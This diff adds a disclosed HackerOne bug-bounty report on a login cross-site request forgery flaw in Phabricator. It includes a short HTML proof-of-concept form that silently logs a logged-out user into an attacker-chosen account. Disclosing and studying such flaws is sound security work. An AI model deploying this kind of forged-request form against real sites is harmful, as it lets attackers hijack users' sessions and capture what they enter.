@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/774
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/dawidczagan
+ReportedTo:Phabricator(phabricator)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:22.02.2014 22:21:32
+
+Summary:
+
+It is possible to log in the user to another account (no CSRF token). POC (for demonstration purposes with Submit button; normally sent automatically):
+
+<html>
+  <body>
+    <form action="http://DOMAIN-WITH-PHABRICATOR/auth/login/password:self/" method="POST">
+      <input type="hidden" name="&#95;&#95;dialog&#95;&#95;" value="1" />
+      <input type="hidden" name="username" value="user3" />
+      <input type="hidden" name="password" value="password3" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+The user needs to be logged out, when the aforementioned request is submitted. It is assumed that user3 with password3 exists.
